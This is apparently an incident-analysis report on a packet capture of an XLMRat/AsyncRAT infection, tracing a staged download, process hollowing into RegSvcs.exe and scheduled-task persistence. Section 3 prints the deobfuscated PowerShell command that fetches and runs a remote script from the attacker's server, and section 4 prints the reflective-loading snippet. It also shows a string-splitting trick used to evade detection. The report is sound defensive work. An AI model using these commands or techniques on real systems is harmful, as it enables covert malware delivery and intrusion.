# Technical Investigation — XLMRat / AsyncRAT

This document records how each finding was reached from the single evidence
file `236-XLMRat.pcap`. All analysis is static/read-only; no malware was executed,
and reconstructed executables were hashed **in memory** without writing them to
disk (host AV quarantines them on write — see the safe-handling note below).

## 1. Triage: who talked to whom

Using scapy (`scripts/recon_pcap.py`) the capture resolves to three IPs:

- `10.1.9.101` — victim endpoint
- `10.1.9.1`   — local DNS/gateway
- `45.126.209.4` — external server (staging + C2)

Conversations:

| Flow | Packets | Meaning |
|---|---|---|
| `10.1.9.101 ⇄ 45.126.209.4:8808` | 1,199 | AsyncRAT C2 |
| `10.1.9.101 ⇄ 45.126.209.4:222` | 349 | HTTP staging (two downloads) |

A single DNS query stands out: `madmrx.duckdns.org` — DuckDNS is free dynamic
DNS commonly used for commodity-RAT C2.

## 2. The two HTTP downloads (stages 1 and 2)

Two HTTP GETs occur on port 222 (`scripts/pcap_to_csv.py` → `data/processed/http.csv`):

| Frame | Request | Response type | Size |
|---|---|---|---|
| 4 | `GET /xlm.txt` | `text/plain` | 1,974 B |
| 12 | `GET /mdm.jpg` | `image/jpeg` | 431,208 B |

`/xlm.txt` is downloaded first → **stage 1**. The `.jpg` is a MIME masquerade
(the body begins with a UTF-8 BOM and `$Content = @'`, i.e. PowerShell).

## 3. Stage 1 — VBScript loader (`xlm.txt`)

Reassembled in memory (`scripts/inspect_scripts.py`). It builds an obfuscated
string from an 88-element array, then runs:

```
Cmd.exe /c POWeRSHeLL.eXe -NOP -WIND HIDDEN -eXeC BYPASS -NONI
  IEX(New-Object Net.WebClient).DownloadString('http://45.126.209.4:222/mdm.jpg')
```

(The literal `DOWNLO` + `VAN` + `.Replace('VAN','ADSTRING')` trick reconstructs
`DownloadString` to evade string matching.)

## 4. Stage 2 — PowerShell (`mdm.jpg`)

The 431 KB script embeds **two** .NET executables as underscore-separated hex
(`$hexString_bbb`, `$hexString_pe`). Rebuilding them in memory and reading the PE
COFF header (`scripts/extract_pe_and_iocs.py`):

| Variable | Role | SHA256 | Compile (UTC) |
|---|---|---|---|
| `$hexString_bbb` | AsyncRAT client (**malware**) | `1eb7b02e…81d798` | 2023-10-30 15:08 |
| `$hexString_pe` | NewPE2 RunPE loader | `2c6c4cd0…1296b8` | (stomped) |

Execution logic (deobfuscated from `#`-padded strings):

```
$Fu = [Reflection.Assembly]::Load($loaderBytes)
$NK = $Fu.GetType('NewPE2.PE')
$MZ = $NK.GetMethod('Execute')
# target process:
C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe
```

→ the AsyncRAT client is **process-hollowed into the signed LOLBin `RegSvcs.exe`**,
so it never touches disk as an `.exe`.

## 5. Persistence

The script writes three files to `C:\Users\Public\` and registers a scheduled task:

- `Conted.ps1`, `Conted.bat`, `Conted.vbs`
- Scheduled task **"Update Edge"** → launches `Conted.vbs` (→ `.bat` → `.ps1`)

## 6. Attribution / classification

The reconstructed client's SHA256 on VirusTotal is flagged by 60/72 vendors; the
**Alibaba** engine labels it `Backdoor:MSIL/AsyncRat.A2786761` → **AsyncRAT**. The
server `45.126.209.4` is hosted by **ReliableSite.Net LLC** (validated against a
published community write-up; the write-up was treated strictly as reference data).

## Safe-handling note

Carving the HTTP objects to disk caused Windows Defender to quarantine them
immediately (real AsyncRAT content). All subsequent analysis therefore reassembles
the payloads in memory and emits only **hashes, metadata, and deobfuscated text** —
never the malicious bytes. The exported CSVs contain benign flow metadata only.
